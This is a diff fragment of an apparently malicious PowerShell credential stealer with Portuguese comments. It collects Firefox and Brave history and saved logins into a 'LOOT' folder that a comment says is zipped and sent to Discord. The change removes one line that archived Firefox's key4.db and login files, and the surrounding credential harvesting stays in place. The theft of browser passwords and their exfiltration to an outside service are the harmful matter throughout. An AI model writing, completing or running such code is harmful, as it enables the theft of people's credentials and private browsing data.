@@ -526,7 +526,7 @@ Get-BrowserData -Browser "firefox" -DataType "logins" | Out-File "$env:TMP\$Fold
 Get-BrowserData -Browser "brave" -DataType "history" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
 Get-BrowserData -Browser "brave" -DataType "logins" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
 ############################################################################################################################################################
-Compress-Archive -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\key4.db", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\login.json", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins-backup.json" -DestinationPath "$env:TMP\$FolderName\Dados-do-Browser\Passwords-Firefox.zip"
+
 
 
 #Comprime a pasta LOOT para depois mandar para o discord
